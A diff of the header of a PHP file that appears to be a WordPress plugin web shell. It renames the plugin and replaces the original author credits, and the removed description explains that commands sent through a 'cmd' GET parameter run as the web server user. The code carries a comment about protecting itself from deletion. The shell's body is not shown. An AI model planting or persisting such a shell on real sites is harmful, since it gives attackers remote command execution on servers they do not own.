@@ -1,13 +1,13 @@
 <?php
 
 /*
-    Plugin Name: Cheap & Nasty Wordpress Shell
-    Plugin URI: https://github.com/leonjza/wordpress-shell
-    Description: Execute Commands as the webserver you are serving wordpress with! Shell will probably live at /wp-content/plugins/shell/shell.php. Commands can be given using the 'cmd' GET parameter. Eg: "http://192.168.0.1/wp-content/plugins/shell/shell.php?cmd=id", should provide you with output such as <code>uid=33(www-data) gid=verd33(www-data) groups=33(www-data)</code>
-    Author: Leon Jacobs
-    Version: 0.3
-    Author URI: https://leonjza.github.io
-*/
+ * Plugin Name: Quick & dirty Wordpress Command Execution Shell
+ * Plugin URI: https://github.com/scheatkode/wordsh
+ * Description: Execute shell commands on your wordpress server
+ * Author: scheatkode
+ * Version: 0.3
+ * Author URI: https://scheatkode.github.io
+ */
 
 // attempt to protect myself from deletion.
 $this_file = __FILE__;
